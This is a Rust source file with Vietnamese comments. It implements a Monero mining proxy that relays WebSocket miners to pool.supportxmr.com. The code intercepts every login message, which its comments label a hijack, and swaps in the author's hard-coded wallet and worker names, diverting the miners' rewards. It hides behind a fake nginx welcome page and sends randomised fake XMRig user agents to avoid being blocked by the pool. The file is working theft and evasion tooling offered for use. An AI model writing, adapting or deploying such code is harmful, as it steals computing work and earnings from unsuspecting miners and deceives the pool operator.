use axum::{
    extract::{WebSocketUpgrade, ws::{Message, WebSocket}, State},
    response::{Html, IntoResponse, Response},
    routing::get,
    Router,
};
use std::{sync::{atomic::{AtomicUsize, Ordering}}, net::SocketAddr, time::Duration};
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncBufReadExt, BufReader};
use tokio::sync::mpsc::{self, UnboundedSender};
use futures_util::{StreamExt, SinkExt};
use serde_json::{Value, json};
use colored::*;
use chrono::Utc;
use rand::Rng; // Nhớ thêm 'rand' vào Cargo.toml

// =================================================================
// ⚡ CẤU HÌNH ĐƠN POOL (SINGLE POOL)
// =================================================================
const LISTEN_ADDR: &str = "0.0.0.0:8080";

// Chỉ sử dụng 1 Pool duy nhất
const REAL_POOL_ADDR: &str = "pool.supportxmr.com:3333";

// Ví của bạn
const MY_XMR_WALLET: &str = "44hQZfLkTccVGood4aYMTm1KPyJVoa9esLyq1bneAvhkchQdmFTx3rsD3KRwpXTUPd1iTF4VVGYsTCLYrxMZVsvtKqAmBiw";

// Tiền tố tên Worker (VD: Proxy_Worker_123)
const WORKER_PREFIX: &str = "Proxy_Worker";

const NGINX_WELCOME: &str = r#"<!DOCTYPE html><html><head><title>Welcome to nginx!</title><style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif;}</style></head><body><h1>Welcome to nginx!</h1><p>If you see this page, the nginx web server is successfully installed and working.</p></body></html>"#;

static TOTAL_SHARES: AtomicUsize = AtomicUsize::new(0);

enum LogEvent {
    ShareAccepted,
    PoolError(String),
    ClientConnect,
}

// Hàm tạo User-Agent giả để Pool không chặn
fn generate_fake_agent() -> String {
    let mut rng = rand::thread_rng();
    let versions = ["6.22.0", "6.21.3", "6.21.0"];
    let compilers = ["gcc/11.4.0", "clang/14.0.0", "msvc/19.30"];
    let v = versions[rng.gen_range(0..versions.len())];
    let c = compilers[rng.gen_range(0..compilers.len())];
    format!("XMRig/{} (Linux x86_64) libuv/1.44.2 {}", v, c)
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt().with_max_level(tracing::Level::ERROR).init();
    let (log_tx, mut log_rx) = mpsc::unbounded_channel::<LogEvent>();
    
    // --- LUỒNG LOGGING ---
    tokio::spawn(async move {
        while let Some(event) = log_rx.recv().await {
            let time = Utc::now().format("%H:%M:%S");
            match event {
                LogEvent::ShareAccepted => {
                    let count = TOTAL_SHARES.fetch_add(1, Ordering::Relaxed) + 1;
                    // Log gọn gàng
                    if count % 5 == 0 {
                        println!("{} [{}] ⛏️  SHARES FOUND: {}", "💎".cyan().bold(), time, count);
                    }
                }
                LogEvent::PoolError(err) => println!("{} [{}] POOL ERROR: {}", "❌".red().bold(), time, err),
                LogEvent::ClientConnect => {},
            }
        }
    });

    let app = Router::new()
        .route("/", get(mining_handler))
        .route("/*path", get(mining_handler)) 
        .with_state(log_tx);

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    println!("{}", "========================================".green());
    println!("{} {}", "🚀 SINGLE-POOL XMR PROXY".green().bold(), addr);
    println!("🔗 Target: {}", REAL_POOL_ADDR.cyan());
    println!("💰 Wallet: {}...", &MY_XMR_WALLET[0..15].yellow());
    println!("{}", "========================================".green());

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn mining_handler(ws: Option<WebSocketUpgrade>, State(log_tx): State<UnboundedSender<LogEvent>>) -> Response {
    match ws {
        Some(w) => w.on_upgrade(move |socket| xmr_tunnel_single(socket, log_tx)),
        None => Html(NGINX_WELCOME).into_response()
    }
}

async fn xmr_tunnel_single(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
    let _ = log_tx.send(LogEvent::ClientConnect);

    // 1. Kết nối thẳng tới Pool duy nhất (Timeout 10s)
    let tcp_stream = match tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(REAL_POOL_ADDR)).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => { let _ = log_tx.send(LogEvent::PoolError(format!("Conn Error: {}", e))); return; },
        Err(_) => { let _ = log_tx.send(LogEvent::PoolError("Conn Timeout".to_string())); return; }
    };

    // 2. Tối ưu Socket (KeepAlive & NoDelay)
    let sock_ref = socket2::SockRef::from(&tcp_stream);
    let mut ka = socket2::TcpKeepalive::new();
    ka = ka.with_time(Duration::from_secs(30)); 
    ka = ka.with_interval(Duration::from_secs(10));
    let _ = sock_ref.set_tcp_keepalive(&ka);
    let _ = tcp_stream.set_nodelay(true);

    let (read_half, mut pool_write) = tcp_stream.into_split();
    // Buffer 64KB cực quan trọng cho XMR RandomX
    let mut pool_reader = BufReader::with_capacity(64 * 1024, read_half); 
    let (mut ws_write, mut ws_read) = socket.split();

    // Sinh thông tin giả cho kết nối này
    let fake_agent = generate_fake_agent();
    let mut rng = rand::thread_rng();
    let worker_id = format!("{}_{}", WORKER_PREFIX, rng.gen_range(1000..9999));

    // --- LUỒNG 1: MINER -> POOL (HIJACK) ---
    let client_to_server = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            if let Message::Text(text) = msg {
                for line in text.lines() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() { continue; }

                    let mut final_msg = trimmed.to_string();

                    // Bắt gói login để tráo ví
                    if trimmed.contains("login") {
                        if let Ok(mut json_val) = serde_json::from_str::<Value>(trimmed) {
                            if let Some(params) = json_val.get_mut("params") {
                                // Xử lý object (XMRig chuẩn)
                                if let Some(obj) = params.as_object_mut() {
                                    obj.insert("login".to_string(), json!(MY_XMR_WALLET));
                                    obj.insert("user".to_string(), json!(MY_XMR_WALLET));
                                    obj.insert("pass".to_string(), json!(worker_id));
                                    obj.insert("rigid".to_string(), json!(worker_id));
                                    // Chèn Agent giả
                                    obj.insert("agent".to_string(), json!(fake_agent));
                                    // Xóa nicehash để tránh xung đột
                                    obj.remove("nicehash"); 
                                }
                                // Xử lý array (Tool lạ)
                                else if let Some(arr) = params.as_array_mut() {
                                    if !arr.is_empty() {
                                        arr[0] = json!(MY_XMR_WALLET);
                                        // Nếu mảng chưa có tên worker, thêm vào
                                        if arr.len() < 2 { arr.push(json!(worker_id)); } 
                                        else { arr[1] = json!(worker_id); }
                                    }
                                }
                            }
                            final_msg = json_val.to_string();
                        }
                    }

                    // Đảm bảo xuống dòng
                    if !final_msg.ends_with('\n') { final_msg.push('\n'); }
                    if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
                }
                // Đẩy gói tin đi ngay lập tức
                let _ = pool_write.flush().await;
            }
        }
    });

    // --- LUỒNG 2: POOL -> MINER (PASS-THROUGH) ---
    let log_tx_pool = log_tx.clone();
    let server_to_client = tokio::spawn(async move {
        let mut buf = Vec::with_capacity(8192);
        loop {
            buf.clear();
            // Đọc đến khi gặp ký tự xuống dòng
            match pool_reader.read_until(b'\n', &mut buf).await {
                Ok(0) => break, // Kết nối đóng
                Ok(_) => {
                    let str_msg = String::from_utf8_lossy(&buf);
                    
                    // Thống kê đơn giản
                    if str_msg.contains("result") && str_msg.contains("OK") {
                         let _ = log_tx_pool.send(LogEvent::ShareAccepted);
                    }
                    // Nếu lỗi từ Pool
                    if str_msg.contains("error") && !str_msg.contains("null") {
                         let _ = log_tx_pool.send(LogEvent::PoolError(str_msg.to_string()));
                    }

                    // Gửi về cho Miner
                    if ws_write.send(Message::Text(str_msg.to_string())).await.is_err() { break; }
                }
                Err(_) => break,
            }
        }
    });

    let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };
}
